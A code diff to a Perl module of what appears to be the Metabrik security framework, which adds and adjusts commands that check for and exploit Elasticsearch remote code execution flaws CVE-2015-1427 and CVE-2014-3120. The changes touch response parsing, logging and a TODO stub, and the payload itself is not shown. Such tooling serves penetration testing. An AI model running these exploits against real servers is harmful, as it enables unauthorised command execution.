@@ -19,9 +19,11 @@ sub brik_properties {
       commands => {
          check_cve_2015_1427_rce => [ qw(uri|OPTIONAL) ],
          exploit_cve_2015_1427_rce => [ qw(command uri|OPTIONAL) ],
+         exploit_cve_2014_3120_rce => [ qw(command uri|OPTIONAL) ],
       },
       require_modules => {
          'Metabrik::String::Json' => [ ],
+         'Metabrik::String::Parse' => [ ],
       },
    };
 }
@@ -58,7 +60,7 @@ sub check_cve_2015_1427_rce {
    my $reply = $self->post($check, $url)
       or return $self->log->error("check_cve_2015_1427_rce: post error");
 
-   my $content = $reply->{_content}
+   my $content = $reply->{body}
       or return $self->log->error("check_cve_2015_1427_rce: no content found");
 
    my $sj = Metabrik::String::Json->new_from_brik_init($self) or return;
@@ -71,7 +73,7 @@ sub check_cve_2015_1427_rce {
    &&  $ref->{hits}{hits}[0]{fields}{myscript}) {
       my $result = $ref->{hits}{hits}[0]{fields}{myscript}[0] || 'undef';
       if ($result ne 'undef') {
-         $self->log->verbose("check_cve_2015_1427_rce: vulnerable");
+         $self->log->verbose("check_cve_2015_1427_rce: vulnerable [$result]");
          return 1;
       }
    }
@@ -83,6 +85,8 @@ sub check_cve_2015_1427_rce {
    return $self->log->error("check_cve_2015_1427_rce: unknown error");
 }
 
+# Thanks to: https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch
+# But they stole our logo font with bleeding letters ;)
 sub exploit_cve_2015_1427_rce {
    my $self = shift;
    my ($command, $uri) = @_;
@@ -115,7 +119,7 @@ sub exploit_cve_2015_1427_rce {
    my $reply = $self->post($check, $url)
       or return $self->log->error("exploit_cve_2015_1427_rce: post error");
 
-   my $content = $reply->{_content}
+   my $content = $reply->{body}
       or return $self->log->error("exploit_cve_2015_1427_rce: no content found");
 
    my $sj = Metabrik::String::Json->new_from_brik_init($self) or return;
@@ -128,7 +132,9 @@ sub exploit_cve_2015_1427_rce {
    &&  $ref->{hits}{hits}[0]{fields}{lupin}) {
       $self->log->verbose("exploit_cve_2015_1427_rce: vulnerable");
       my $result = $ref->{hits}{hits}[0]{fields}{lupin}[0] || 'undef';
-      return $result;
+
+      my $sp = Metabrik::String::Parse->new_from_brik_init($self) or return;
+      return $sp->to_array($result);
    }
    else {
       $self->log->verbose("exploit_cve_2015_1427_rce: NOT vulnerable");
@@ -143,6 +149,9 @@ sub exploit_cve_2015_1427_rce {
 # http://bouk.co/blog/elasticsearch-rce/
 #
 sub exploit_cve_2014_3120_rce {
+   my $self = shift;
+
+   return $self->log->error("exploit_cve_2014_3120_rce: TODO");
 }
 
 1;
